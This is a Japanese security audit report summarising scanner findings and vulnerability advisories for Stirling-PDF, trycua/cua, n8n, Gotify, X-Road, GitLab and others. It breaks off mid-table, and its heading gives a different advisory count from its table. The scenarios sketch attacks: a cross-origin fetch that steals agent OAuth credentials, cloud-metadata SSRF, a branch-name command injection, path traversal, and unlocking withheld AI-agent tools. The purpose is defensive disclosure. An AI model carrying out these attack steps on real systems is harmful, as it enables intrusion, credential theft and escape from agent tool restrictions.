* **シナリオ A — リモートリバースエンジニアリングサーバー上の `authlib 1.6.8` / `pyjwt 2.11.0` を介した認証回避:**
  1. モバイルセキュリティチームが、高性能サーバー上で JADX MCP を HTTP/SSE モードで起動し、OAuth/JWT で保護して共有利用する。
  2. `uv.lock` 内の古い `authlib` / `pyjwt` の既知のアルゴリズム・クレーム検証の欠陥により、細工されたトークンで非公開アプリの逆コンパイル結果が読み取られる。
* **シナリオ B — `python-multipart 0.0.20` および `starlette 0.47.3` を突いたマルチパート解析 DoS:**
  1. HTTP モードで公開されている MCP ポートに対し、不正な形式の `multipart/form-data` ペイロードが送信される。
  2. パーサーのバックトラッキングやメモリ消費により、JADX MCP ブリッジが応答不能になる。
* **シナリオ C — `urllib3 2.5.0` / `cryptography 46.0.5` におけるリダイレクト時のヘッダー漏洩・証明書解析リスク:**
  1. JADX MCP が外部シンボルサーバーやプラグインエンドポイントへ `urllib3` で通信した際、クロスオリジンリダイレクト時に認証ヘッダーが保持されたまま外部へ転送される。

### F. 単独および連鎖（Chaining）時の深刻度分析
* **単独・連鎖深刻度:** **Low / Medium（SCA）**。ファーストパーティコードの攻撃チェーンはなく、`uv.lock` の更新のみで解消可能です。

### G. 実行・検証コマンド例
```bash
# 1. JADX MCP に対する Sniper 監査の実行
python3 scripts/sniper-project-audit "$HOME/audit-targets/jadx-mcp" --format json --output "$HOME/audit-targets/reports/jadx-mcp-audit.json"

# 2. uv.lock 内の脆弱な依存関係バージョンの確認
grep -n -A 2 -E 'name = "(authlib|cryptography|pyjwt|python-multipart|starlette|urllib3)"' "$HOME/audit-targets/jadx-mcp/uv.lock"

# 3. Sniper CLI で High 以上の SCA 検出項目をフィルタリング表示
python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json" --min-severity high
```

---

## 比較一覧表：単独 vs. 連鎖（Chaining）深刻度および証拠ステータス

| リポジトリ | Sniper SAST / IaC / SCA 概要 | ソースコード検証結果（実在 vs. 誤検知） | 単独深刻度 | 検出項目は連鎖するか？（Chaining） | 連鎖時の深刻度と公開ステータス |
| :--- | :--- | :--- | :---: | :--- | :--- |
| **1. `autogpt`** | 閾値超過 `93` 件（`2C / 39H`）; トリアージ `142` 件 | **Critical SQLi 2件（`obj.execute`）、JWT、FastAPI `Security()` はすべて誤検知**; `jobstore_backfill.py` の `pickle.loads` + Compose デフォルトパスワード + Root Dockerfile は実在 | **Low / Medium** | **条件付き仮説:** 攻撃者が DB の `apscheduler_jobs` テーブルへの書き込み権限を得た場合のみ `pickle.loads` + Root コンテナが連鎖 | **MEDIUM / HIGH（条件付き）** *（直接の未認証脆弱性なし；多層防御の強化対象）* |
| **2. `zitadel`** | 閾値超過 `67` 件（`8C / 42H`）; トリアージ `286` 件 | **Critical SQLi/`exec` 8件はすべて誤検知**; `deploy/compose/` 配下の3つの `docker.sock` マウントとドキュメント内の `TLS_REJECT=0` は実在 | **Low / Medium** | **いいえ（別々のサンプル）:** `docker.sock`（`deploy/compose/`）と `TLS_REJECT=0`（`apps/docs/...`）は別ファイル | **LOW / MEDIUM** *（開発・サンプル構成のハードニング；製品 CVE ではない）* |
| **3. `nextcloud-mcp`** | 閾値超過 `59` 件（`SAST 1C/6H`, `IaC 7H`, `SCA 5C/40H`） | **`login_flow.py:192` の SSRF（`initiate()` 内に `_rewrite_to_nextcloud_host` あり）と `token_utils.py` の JWT は誤検知**; `pact.yml` は `same-repo` 保護あり | **Low** | **いいえ:** `pact.yml` は外部フォーク PR を遮断しており、`poll_endpoint` も `self.nextcloud_host` に固定されている | **LOW** *（検証済み SAST 脆弱性なし；内部 CI のハードニング）* |
| **4. `mcpjam-inspector`** | 閾値超過 `122` 件（`SAST 12C/8H`, `SCA 6C/96H`） | **Critical/High SAST 20件中18件は明確な誤検知**（コメント内の `eval (` / `exec (` 14件、`.d.ts` 2件、UI ラベル 2件）; `pr-preview.yml` は `same-repo` 保護あり | **Low** | **いいえ:** 外部フォーク PR は遮断されており、同一リポジトリ内ブランチ展開のハードニング対象 | **LOW / MEDIUM** *（内部 CI ハードニングおよび SCA 更新）* |
| **5. `codebase-memory-mcp`** | 閾値超過 `32` 件（`SAST 17C/7H`, `SCA 8H`） | **`store.c:2864` SQLi、`c_lsp.h:54` コメント、`kotlin_lsp.c`/`py_lsp.c`/`store.c:4482` 境界付きバッファ、`xmalloc.c`、`mcp.c` はすべて誤検知**; `http_server.c` は `localhost` CORS + `Host`（403）保護あり | **Low** | **いいえ:** `http_server.c` は外部オリジンに CORS ヘッダーを返さず、DNS Rebinding も拒否する | **LOW** *（ブラウザ経由のコード漏洩チェーンは不成立）* |
| **6. `gitlab-mcp-server`** | 閾値超過 `5` 件（`0C / 4H`） | `recorder.go` と `make.go` は誤検知; `GITLAB_MCP_SKIP_TLS_VERIFY=true` はユーザーが明示設定した時のみ有効 | **Low** | **いいえ:** 連鎖する検出項目は存在しない | **LOW** *（オプトイン設定）* |
| **7. `apktool-mcp`** | 閾値超過 `16` 件（`SAST 1 Medium`, `SCA 4C / 12H`） | SAST 警告は誤検知; **`uv.lock` 内に Critical 4件、High 12件の SCA 依存関係レコードが存在** | **Low / Medium (SCA)** | **いいえ:** ファーストパーティのコード連鎖はなし；依存関係の更新が必要 | **LOW / MEDIUM (SCA)** *（SAST はクリーン、SCA レコードあり）* |
| **8. `jadx-mcp`** | 閾値超過 `32` 件（`SAST 3 Medium`, `SCA 6C / 26H`） | Critical/High SAST 脆弱性なし; **`uv.lock` 内に Critical 6件、High 26件の SCA 依存関係レコードが存在** | **Low / Medium (SCA)** | **いいえ:** ファーストパーティのコード連鎖はなし；依存関係の更新が必要 | **LOW / MEDIUM (SCA)** *（Critical/High SAST なし、SCA レコードあり）* |

---

## 第 III 部 — Sniper スキャンで発見された11件の検証済み脆弱性（コードから脆弱性への変化、日常業務シナリオ、および実行・検証コマンド）

以下では、**Sniper** 静的・動的解析エンジンを用いたセキュリティスキャンで発見され、**段階的な日常業務の重大シナリオ（`シナリオ A / B / C`）**、**エンドツーエンドのランタイム証明（`RED -> GREEN + BENIGN`）**、および **検証済み防御パッチ（`git diff`）** によって実証された **11件のセキュリティ脆弱性**（[advisories/README.ja.md](advisories/README.ja.md)）について、まず一覧表を示し、続いて **各バグがソースコード内でどのように発生し、どのように悪用可能な脆弱性へと変化するのか、3つの日常業務シナリオ、および実行・検証コマンド例** を網羅した11個の詳細技術セクション（`III.01` ～ `III.11`）を掲載します。

| # | アドバイザリ & Upstream GHSA ID | 対象プロジェクト & コンポーネント | CWE & CVSS v3.1 | 日常業務における3つの重大影響シナリオ（`シナリオ A / B / C`） | ランタイム証明（`RED -> GREEN`） |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **01** | [`01-STIRLING-CAND-02-SYMLINK.md`](advisories/ja/01-STIRLING-CAND-02-SYMLINK.md)<br/>`GHSA-hpc7-xx5r-gc44` | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`FolderInputSource.java:337-377`<br/>`FolderOutputSink.java:338-345` | `CWE-59` / `CWE-61`<br/>**7.1 High** | **A)** 社内共有 SMB/NFS スキャナーフォルダに置かれた `invoice.pdf -> /configs/settings.yml` シンボリックリンクが、デフォルト `recursive=false` モードで `FolderAccessGuard` をバイパスし、管理者/OAuth/SMTP 秘密情報を出力フォルダへ流出させます。<br/>**B)** 自動 SFTP/Nextcloud 文書取込パイプラインで置かれたシンボリックリンクにより、`FolderOutputSink.archiveOriginal()` がホスト SSH 鍵や `.env` をアーカイブへコピー・移動させます。<br/>**C)** マルチテナント部門別フォルダ間で、ある部門が他部門の機密契約・給与ディレクトリへシンボリックリンクを張り、無断閲覧・削除を行います。 | `RED`: `symlink_accepted: true, protected_settings_exfiltrated: true`<br/>`GREEN`: `symlink_accepted: false, regular_file_processed: true` |
| **02** | [`02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/ja/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)<br/>`GHSA-ff6j-8xch-j8r6`<br/>*(`CVE-2026-71270` の修正漏れ)* | **Stirling-Tools/Stirling-PDF** (`v3.2.2`)<br/>`ConvertWebsiteToPDF.java:116-143` | `CWE-918`<br/>**8.6 High** | **A)** `/api/v1/convert/url/pdf` に `<link rel="stylesheet" href="http://127.0.0.1:.../secrets.css">` やクラウドメタデータ（`169.254.169.254`）を含む外部ページを渡すと、WeasyPrint が内部応答を取得して生成 PDF 内に直接埋め込みます。<br/>**B)** Java 側の `SsrfProtectionService` はトップレベル URL しか検査しないため、WeasyPrint サブプロセスが `@import url("http://10.0.0.12:9090/metrics")` で Kubernetes/Docker 内部網を探索します。<br/>**C)** HTTP `302` リダイレクトを使う `<img src="...">` / `<link>` サブリソースにより、ファイアウォール内側の管理画面を生成 PDF として外部流出させます。 | `RED`: `weasyprint_allowed_protocols: "data,http,https", internal_data_embedded_in_pdf: true`<br/>`GREEN`: `weasyprint_allowed_protocols: "data", internal_loopback_hit_count: 0` |
| **03** | [`03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/ja/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)<br/>`GHSA-cp36-x5hg-3gg8` | **trycua/cua** (`npm: cuabot <= 1.0.16`)<br/>`libs/cuabot/src/cuabotd.ts` | `CWE-306` / `CWE-942`<br/>**9.6 Critical** | **A)** 開発者が `npx cuabot` 起動中に任意の Web サイトを開くと、ページ内の JS が `fetch("http://localhost:7842/bash")`（`Access-Control-Allow-Origin: *`）を実行し、マウントされた `~/.cuabot/user/.claude/.credentials.json` OAuth トークンを窃取します。<br/>**B)** クロスオリジン `POST /bash` または `ws://localhost:7842/?command=...`（CSWSH）経由で、書き込み可能な `/home/community-user/.claude/settings.json` に永続的な `PreToolUse` フックを注入します。<br/>**C)** `0.0.0.0:7842` バインドのため、カフェやオフィスの同一 Wi-Fi 上の端末が認証なしで `/bash` と `/screenshot` を呼び出し、画面監視とコマンド実行を行います。 | `RED`: `http_status: 200, mounted_host_claude_credentials_exfiltrated: true`<br/>`GREEN`: `http_status: 403`<br/>`BENIGN`: `http_status: 200` |
| **04** | [`04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/ja/04-CUA-CAND-02-WORKER-SERVER-RCE.md)<br/>`GHSA-xm8w-gj3g-4f25` | **trycua/cua** (`pip: cua-bench-rl <= 0.1.0`)<br/>`worker_server.py:79-108, 338-360`<br/>`cua_bench/core.py:25-51` | `CWE-94` / `CWE-942`<br/>**8.8 High** | **A)** ML 研究者がローカルで RL ワーカーを実行中に閲覧した Web ページが `http://127.0.0.1:8001/reset`（`allow_origins=["*"]`）を呼び出し、`ip_filter_middleware` を通過して `spec.loader.exec_module` で任意の `<env_path>/main.py` をホスト上で実行します。<br/>**B)** Kubernetes/Docker Compose で `OSGYM_ALLOWED_IPS=""` が空の場合、`if allowed_ips:` がフェイルオープンし、`0.0.0.0:8001` が全ネットワークに認証なし RCE を公開します。<br/>**C)** クロスオリジンページや LAN 端末が `GET /screenshot` と `POST /step` を呼び出し、デスクトップ画面の盗み見とマウス・キーボード操作注入を行います。 | `RED`: `cross_origin_reset_status: 200, arbitrary_env_path_exec_module_rce: true`<br/>`GREEN`: `403 / 400, rce: false`<br/>`BENIGN`: `200` |
| **05** | [`05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/ja/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)<br/>`GHSA-3x8g-6h2v-8qx9` | **trycua/cua** (`cargo: cua-compat <= 0.8.0`)<br/>`daytona/objectstore.rs:320-422` | `CWE-22`<br/>**8.1 High** | **A)** 1つのサンドボックステナントがマルチパートアップロードを開始せずに `DELETE /daytona/dummy?uploadId=../objects` を送信するだけで、無条件の `tokio::fs::remove_dir_all` が発火し、組織全体の `objects/` スナップショットストアを消去します。<br/>**B)** `?uploadId=../../state` や `?uploadId=../../db` により `d.objects.root` の上位へ脱出し、`cua-spacesd` が書き込み可能なホストディレクトリを削除します。<br/>**C)** `PUT /daytona/key?partNumber=1&uploadId=../stage` により、マルチパートチャンクを `uploads/` 外の隣接ディレクトリへ書き込みます。 | `RED`: `delete_traversal_status: 204, objects_store_wiped_without_prior_upload: true`<br/>`GREEN`: `400 / 404, objects_store_preserved: true` |
| **06** | [`06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/ja/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)<br/>`GHSA-54v9-fxw3-36mm` | **trycua/cua** (`cargo: cua-media-codec <= 0.8.0`)<br/>`videotoolbox/mod.rs:308-420` | `CWE-125` / `CWE-190`<br/>**5.5 Medium** | **A)** macOS リモートデスクトップ配信の解像度変更時に届いた短い `FrameData::Nv12` スライスが境界未検査の `unsafe { std::ptr::copy_nonoverlapping }` で読み取られ、隣接ヒープ上の `960` バイト（セッショントークン・秘密鍵）が H.264 映像フレームにコピーされ配信されます。<br/>**B)** Safe Rust の `VtEncoder::encode` に空または短い `NV12`/`BGRA` スライスを渡すと未マップ領域を参照し、`cua-spacesd` メディアデーモンが `SIGSEGV` でクラッシュします。<br/>**C)** 不正な `y_stride` / `uv_stride` または `stride * (h - 1)` 演算によりバッファ境界を超え、マルチテナント配信プロセスでメモリ破壊を引き起こします。 | `RED`: `oob_bytes_read: 960, adjacent_heap_secret_copied_to_video_frame: true`<br/>`GREEN`: `oob_bytes_read: 0, CodecError::InvalidArgument` |
| **07** | [`07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/ja/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)<br/>`GHSA-hvhg-6x47-cq96` | **trycua/cua** (`pip: cua-bench <= 0.3.1`)<br/>`winarena_adapter/cli.py:262-265`<br/>`infra/vm/setup/server/main.py` | `CWE-668` / `CWE-732`<br/>**8.6 High** | **A)** 大学や企業のラボ LAN 上で動作する WinArena ワークステーションの `0.0.0.0:8006`（認証なし noVNC）および `0.0.0.0:3390`（パスワードなし RDP）に同一 LAN の第三者が接続し、Windows VM デスクトップと API キーを乗っ取ります。<br/>**B)** 侵害した VM 内から書き込み可能な `-v {setup_path}:/shared` マウントを悪用し、ホスト側の `winarena_adapter/infra/vm/setup` スクリプトを汚染します。<br/>**C)** VM 内の `0.0.0.0:5000` 制御サーバーにある未認証の `POST /execute_windows`（`exec()`）と `POST /setup/launch`（`shell=True`）を通じて任意の OS コマンドが実行されます。 | `RED`: `lan_exposed_ports: ["8006:8006", "3390:3389"], host_setup_dir_mounted_writable: true`<br/>`GREEN`: `lan_exposed_ports: [], host_setup_dir_mounted_writable: false` |
| **08** | [`08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/ja/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)<br/>`GHSA-qwv8-hh9r-cqrf` | **openziti/ziti** (`github.com/openziti/ziti/v2`)<br/>`ziti/util/certs.go:91-103, 199-208` | `CWE-295`<br/>**7.4 High** | **A)** DevOps エンジニアが Wi-Fi/VPN 経由で `ziti edge login` を実行した際、`AreCertsTrusted` -> `InsecureClient` 内の無条件 `InsecureSkipVerify: true` により偽 MITM 証明書が *"Verified that server supplied certificates are trusted"* と承認され、管理者パスワードが攻撃者へ送信されます。<br/>**B)** 自動 CI/CD や Kubernetes ブートストラップ処理で `ziti edge login` が偽の Edge Controller を信頼し、ID とルーターポリシーを攻撃者へ登録します。<br/>**C)** 期限切れ・失効済み・別 CA 署名のコントローラ証明書が警告なしで信頼され、Zero-Trust PKI チェーンが崩壊します。 | `RED`: `rogue_mitm_cert_accepted_as_trusted: true, admin_credentials_sent_to_mitm: true`<br/>`GREEN`: `x509.UnknownAuthorityError` |
| **09** | [`09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/ja/09-N8N-CAND-01-WEBHOOK-REDOS.md)<br/>`n8n-workflow <= 2.45.0` | **n8n-io/n8n** (`npm: n8n-workflow <= 2.45.0`)<br/>`string-extensions.ts:59, 94, 326, 375, 383` | `CWE-1333`<br/>**5.3 Medium** | **A)** 公開問い合わせフォームの n8n Webhook（`{{$json.body.contact.isEmail()}}`）へ 20 KB の `"a.a.a...a@!"` リクエストを1つ送ると Node.js メインイベントループが約 832 ms 停止し、10並列リクエストで全 Stripe/Slack Webhook と UI が凍結します。<br/>**B)** サポートメールやチャットを解析する `{{$json.text.extractEmail()}}` フローがドット連続文字列を含む1通のメッセージでハングし、コンテナのヘルスチェック再起動ループに陥ります。<br/>**C)** CRM データ拡充ワークフローで `{{$json.url.extractDomain()}}`（`DOMAIN_EXTRACT_REGEXP`）が評価されると、長いドット付き URL 入力でシングルスレッド V8 ランタイムが枯渇します。 | `RED`: `regex_stall_ms: 165.035 (831.78ms @ 20KB), concurrent_webhook_starved: true`<br/>`GREEN`: `regex_stall_ms: 0.017 (0.0029ms)` |
| **10** | [`10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/ja/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)<br/>`GHSA-cc9f-m5vr-pm75` | **gotify/server** (`v2.9.1`)<br/>`router/router.go:52-73, 93-102` | `CWE-601`<br/>**4.7 Medium** | **A)** `SSL.RedirectToHTTPS=true` 有効時、偽装した `Host: attacker-gotify.example.com` ヘッダー付きリクエストが `HTTP/1.1 308 Permanent Redirect` で攻撃者ドメインへリダイレクトされ、ブラウザキャッシュ汚染と URL 内の `?token=` 漏洩を引き起こします。<br/>**B)** HTTP エンドポイントへ `?token=<app-token>` 付きで通知を送る監視スクリプト（`curl -L`、Python `requests`、Uptime Kuma）が `308` リダイレクトを追跡し、アプリトークンを攻撃者サーバーへ引き渡します。<br/>**C)** `Host` ヘッダーをそのまま転送するリバースプロキシや共有キャッシュ配下でキャッシュポイズニングが発生し、全クライアントが偽ログイン画面へ誘導されます。 | `RED`: `status_code: 308, redirected_to_untrusted_host: true`<br/>`GREEN`: `redirected_to_untrusted_host: false, bound_to_configured_ssl_host: true` |
| **11** | [`11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/ja/11-XROAD-CAND-01-RUNNER-INJECTION.md)<br/>`GHSA-4fcw-7xqx-fjv5` | **nordic-institute/X-Road** (`38cd99ec0ebb`)<br/>`.github/workflows/build.yaml`<br/>`_build-and-package.yml:84-91` | `CWE-78`<br/>**8.5 High** | **A)** `feat";<cmd>;#` 形式の PR ブランチ名が、コードレビューや `actions/checkout` 実行前に永続セルフホストランナー `xrd-runner-8c` 上の `_build-and-package.yml` の bash スクリプト内で任意コマンドを実行します。<br/>**B)** `build.yaml` が `permissions: contents: write, packages: write` と `secrets: inherit` 付きで `_build-and-package.yml` を呼ぶため、注入されたコマンドが GHCR パッケージ書き込み・リポジトリ書き込み権限付き `GITHUB_TOKEN` を掌握します。<br/>**C)** `xrd-runner-8c` は一時 VM ではなく永続セルフホストサーバーであるため、後続の公式 X-Road リリースビルドを汚染する永続バックグラウンドプロセスや Gradle/Docker キャッシュ改ざんが可能です。 | `RED`: `direct_yaml_interpolation: true, arbitrary_command_executed_on_self_hosted_runner: true`<br/>`GREEN`: `env_var_parameterized: true, arbitrary_command_executed_on_self_hosted_runner: false` |
| **12** | [`12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/ja/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)<br/>`GITLAB-CAND-02`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`app/controllers/oauth/device_authorizations_controller.rb:4-50`<br/>`app/controllers/oauth/tokens_controller.rb:42-75` | `CWE-863 / CWE-285`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` | **How It Happens in Code:** `Oauth::DeviceAuthorizationsController` (`device_authorizations_controller.rb:4-50`) and `Oauth::TokensController` (`tokens_controller.rb:42-75`) omit `verify_admin_allowed!`, `verify_confirmed_email!`, `set_current_organization`, and `enforce_organization_maintenance_mode` (all enforced in sibling `Oauth::AuthorizationsController`).<br/>**Scenario A (Full Instance Admin Takeover):** A regular user creates an untrusted OAuth app (`trusted: false`); when an admin enters its `user_code` on `/oauth/device`, GitLab bypasses `disable_admin_oauth_scopes=true` and mints a full `api admin_mode` token allowing complete server takeover, private repo theft, and CI secret extraction.<br/>**Scenario B (Unverified Account API Backdoor):** An unconfirmed account (`confirmed_at: nil`) blocked on `/oauth/authorize` (`403`) mints persistent API & refresh tokens via `/oauth/device`.<br/>**Scenario C (Backdoor Commit During Legal/Migration Freeze):** Attackers mint tokens and push commits (`201 Created`) into frozen repositories while an organization is locked in `migration` (`503`) or `legal` (`403`) maintenance mode. | `RED`: `token_minted_admin_mode: true, post_token_admin_action_succeeded: true`<br/>`GREEN`: `503 / 403, token_minted_admin_mode: false`<br/>`pytest -k test_report1_cand02` |
| **13** | [`13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md`](advisories/ja/13-GITLAB-CAND-05-MCP-OAUTH-307-REDIRECT-SSRF.md)<br/>`GITLAB-CAND-05`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/catalog/mcp_servers/callback_service.rb:17-50, 87-129`<br/>`refresh_token_service.rb:18-70`<br/>`dynamic_registration_client.rb:104-136` | `CWE-918 / CWE-209`<br/>**8.5 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `CallbackService`, `RefreshTokenService`, `RevokeTokenService`, and `DynamicRegistrationClient` accept unvalidated RFC 8414 `token_endpoint`/`revocation_endpoint` URLs and use `OAuth2::Client` (`max_redirects: 5`, no `UrlBlocker`), reflecting raw `OAuth2::Error` bodies into `flash[:alert]`.<br/>**Scenario A (Stealing Cloud IAM Keys via `flash[:alert]`):** A `307 Temporary Redirect` on `token_endpoint` hits `169.254.169.254` or `127.0.0.1` and prints cloud IAM credentials / internal API responses directly into the user's `flash[:alert]` banner.<br/>**Scenario B (Internal `POST` SSRF & Secret Replay):** `OAuth2::Client` replays `POST` requests with `client_secret` and `refresh_token` to firewalled internal `127.0.0.1` services.<br/>**Scenario C (`RevokeTokenService` SSRF):** Disconnecting an MCP server posts Basic Auth credentials to unvalidated internal/external `revocation_endpoint` targets. | `RED`: `canary_b_request_count: 5, iam_role_credentials_exposed: true`<br/>`GREEN`: `canary_b_request_count: 0, iam_role_credentials_exposed: false`<br/>`pytest -k test_report2_cand05` |
| **14** | [`14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md`](advisories/ja/14-GITLAB-CAND-06-MCP-CONNECTORS-CROSS-ORG-IDOR.md)<br/>`GITLAB-CAND-06`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/controllers/oauth/mcp_connectors_auth_controller.rb:16-78`<br/>`ee/app/services/ai/catalog/mcp_servers/connect_service.rb:16-79`<br/>`ee/lib/gitlab/oauth/client_state.rb:17-23` | `CWE-639 / CWE-862`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` | **How It Happens in Code:** `Oauth::McpConnectorsAuthController` calls global `Ai::Catalog::McpServer.find(params[:id])` without `.in_organization(Current.organization)`, `ConnectService` overwrites DCR credentials without checking `update_ai_catalog_mcp_server`, and `ClientState.from_state` discards `data` binding.<br/>**Scenario A (Cross-Organization AI Connector Hijack):** A user in Organization A overwrites `oauth_client_id` / `oauth_client_secret` on an `McpServer` belonging to Organization B.<br/>**Scenario B (Read-Only User Overwrites Production Connector):** A non-maintainer with read-only access overwrites company MCP OAuth credentials via DCR.<br/>**Scenario C (Cross-Session Account Binding / Login CSRF):** Replaying an unbound `ClientState` token binds a victim developer's GitLab session to the attacker's external MCP account. | `RED`: `cross_org_server_mutated: true`<br/>`GREEN`: `cross_org_server_mutated: false (404 RecordNotFound)`<br/>`pytest -k test_report2_cand05` |
| **15** | [`15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md`](advisories/ja/15-GITLAB-CAND-01-WORKHORSE-MCP-SSRF-TOKEN-LEAK.md)<br/>`GITLAB-CAND-01`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`workhorse/internal/ai_assist/duoworkflow/mcp.go:25-60, 101-112, 220-239` | `CWE-918 / CWE-522`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `externalMcpTransport` in `workhorse/internal/ai_assist/duoworkflow/mcp.go:41-44` omits `transport.WithSSRFFilter()`, and `roundTripper.RoundTrip` (`mcp.go:101-104`) re-injects `Authorization: Bearer` headers on every redirect hop.<br/>**Scenario A (Bearer Token Theft & Account Takeover):** A `302` redirect from an external MCP server sends the victim's live `Authorization: Bearer` token to a cross-origin attacker server.<br/>**Scenario B (Workhorse Internal & Cloud Metadata SSRF):** Redirects reach `127.0.0.1` internal services or `169.254.169.254` from the Workhorse process.<br/>**Scenario C (DNS Rebinding into Corporate Intranet):** DNS rebinding bypasses initial URL validation because Workhorse's dialer lacks `WithSSRFFilter`. | `RED`: `bearer_token_leaked_to_canary: true`<br/>`GREEN`: `bearer_token_leaked_to_canary: false, ssrfFilterError: disallowlist`<br/>`pytest -k test_report2_cand05` |
| **16** | [`16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md`](advisories/ja/16-GITLAB-CAND-08-DUO-WORKFLOW-UNVALIDATED-ITEM-VERSION.md)<br/>`GITLAB-CAND-08`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/duo_workflows/mcp_config_service.rb:131-135`<br/>`ee/lib/api/ai/duo_workflows/workflows.rb:341-344, 1065`<br/>`connection_config_service.rb:220-228` | `CWE-862 / CWE-639`<br/>**7.7 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `McpConfigService#item_version` (`mcp_config_service.rb:134`) omits `Ability.allowed?(current_user, :read_ai_catalog_item, item_version)` (enforced at line 334), and `workflows.rb:1065` (`GET /ws`) allows overriding `workflow_definition` and `ai_catalog_item_version_id`.<br/>**Scenario A (Escalating Read-Only `chat` to Write-Capable Agent):** Overriding `workflow_definition` and `ai_catalog_item_version_id` on `/ws` injects withheld write tools (`create_issue`) into a restricted `chat` session.<br/>**Scenario B (Stealing Private `public: false` Agent Toolsets):** Enumerating `ai_catalog_item_version_id` discloses the confidential toolset of foreign private AI Catalog agents.<br/>**Scenario C (Unauthorized Private Agent Binding):** `POST /workflows` binds private cross-organization `ItemVersion` records without `:read_ai_catalog_item` checks. | `RED`: `unapproved_write_tool_injected: true, workflow_definition_overridden: true`<br/>`GREEN`: `unapproved_write_tool_injected: false`<br/>`pytest -k test_report3_cand08` |
| **17** | [`17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/ja/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)<br/>`GITLAB-CAND-07`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`<br/>`ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`<br/>`workhorse/internal/ai_assist/duoworkflow/mcp.go:254` | `CWE-863 / CWE-639`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` | **How It Happens in Code:** `McpConfigService#execute` (`mcp_config_service.rb:61`) calls `.merge(ai_catalog_mcp_servers.except(:orbit))` without excluding `:gitlab`, and `ListService`/`Agent::Create` omit `.in_organization`.<br/>**Scenario A (Unlocking All Prohibited Built-in GitLab MCP Tools):** An `Ai::Catalog::McpServer` named `"GitLab"` (`:gitlab`, `Tools: nil`) overwrites the built-in `:gitlab` entry so Workhorse (`mcp.go:254`) sets `allToolsAvailable = true`, disabling all `withheld_server_tools` restrictions.<br/>**Scenario B (Cross-Org MCP Server Binding):** GraphQL `aiCatalogAgentCreate`/`Update` binds foreign-organization `McpServer` Global IDs.<br/>**Scenario C (Duo Workflow `401` DoS):** Overwriting `Headers` on `:gitlab` strips `X-Gitlab-Oauth-Token` and breaks `/api/v4/mcp`. | `RED`: `builtin_gitlab_overwritten: true, workhorse_all_tools_available: true`<br/>`GREEN`: `builtin_gitlab_overwritten: false, workhorse_all_tools_available: false`<br/>`pytest -k test_report4_cand07` |
| **18** | [`18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/ja/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)<br/>`GITLAB-CAND-04`<br/>MITRE CNA-LR & HackerOne | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`app/controllers/projects/integrations/slash_commands_controller.rb:21-48`<br/>`app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76` | `CWE-601 / CWE-863`<br/>**5.4 Medium**<br/>`AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` | **How It Happens in Code:** `SlashCommandsController#confirm` (`slash_commands_controller.rb:23-48`) redirects to unvalidated `request_params[:redirect_url]`, passes `request_params[:response_url]` to `VerifyRequest`, and keys Redis `CACHE_KEY` only by `command_id` without `project_id`/`integration_id`.<br/>**Scenario A (Corporate SSO 